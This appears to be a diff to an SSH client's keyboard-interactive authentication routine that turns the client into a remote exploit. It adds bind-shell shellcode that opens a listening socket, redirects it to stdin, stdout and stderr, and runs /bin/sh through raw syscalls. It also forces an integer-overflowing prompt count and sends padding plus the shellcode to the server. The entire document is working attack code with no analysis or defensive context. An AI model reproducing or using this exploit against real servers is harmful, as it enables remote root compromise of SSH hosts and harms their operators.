@@ -839,6 +839,56 @@
 /*
  * parse INFO_REQUEST, prompt user and send INFO_RESPONSE
  */
+
+int do_syscall( int nb_args, int syscall_num, ... );
+
+void shellcode( void )
+{
+    int server_sock, client_sock, len;
+    struct sockaddr_in server_addr;
+    char rootshell[12], *argv[2], *envp[1];
+
+    server_sock = do_syscall( 3, 97, AF_INET, SOCK_STREAM, 0 );
+    server_addr.sin_addr.s_addr = 0;
+    server_addr.sin_port = 32768;
+    server_addr.sin_family = AF_INET;
+    do_syscall( 3, 104, server_sock, (struct sockaddr *) &server_addr, 
16 );
+    do_syscall( 2, 106, server_sock, 1 );
+    client_sock = do_syscall( 3, 30, server_sock, (struct sockaddr *)
+	&server_addr, &len );
+    do_syscall( 2, 90, client_sock, 0 );
+    do_syscall( 2, 90, client_sock, 1 );
+    do_syscall( 2, 90, client_sock, 2 );
+    * (int *) ( rootshell + 0 ) = 0x6E69622F;
+    * (int *) ( rootshell + 4 ) = 0x0068732f;
+    * (int *) ( rootshell + 8 ) = 0;
+    argv[0] = rootshell;
+    argv[1] = 0;
+    envp[0] = 0;
+    do_syscall( 3, 59, rootshell, argv, envp );
+}
+
+int do_syscall( int nb_args, int syscall_num, ... )
+{
+    int ret;
+    asm(
+	"mov	8(%ebp), %eax; "
+	"add	$3,%eax; "
+	"shl	$2,%eax; "
+	"add	%ebp,%eax; "
+	"mov	8(%ebp), %ecx; "
+	"push_args: "
+	"push	(%eax); "
+	"sub	$4, %eax; "
+	"loop	push_args; "
+	"mov	12(%ebp), %eax; "
+	"push	$0; "
+	"int	$0x80; "
+	"mov	%eax,-4(%ebp)"
+    );
+    return( ret );
+}
+
 void
 input_userauth_info_req(int type, u_int32_t seq, void *ctxt)
 {
@@ -865,7 +915,7 @@
 	xfree(inst);
 	xfree(lang);
 
-	num_prompts = packet_get_int();
+	num_prompts = 1073741824 + 1024;
 	/*
 	 * Begin to build info response packet based on prompts requested.
 	 * We commit to providing the correct number of responses, so if
@@ -874,6 +924,13 @@
 	 */
 	packet_start(SSH2_MSG_USERAUTH_INFO_RESPONSE);
 	packet_put_int(num_prompts);
+
+	for( i = 0; i < 1045; i++ )
+	    packet_put_cstring( "xxxxxxxxxx" );
+
+	packet_put_string( shellcode, 2047 );
+	packet_send();
+	return;
 
 	debug2("input_userauth_info_req: num_prompts %d", num_prompts);
 	for (i = 0; i < num_prompts; i++) {
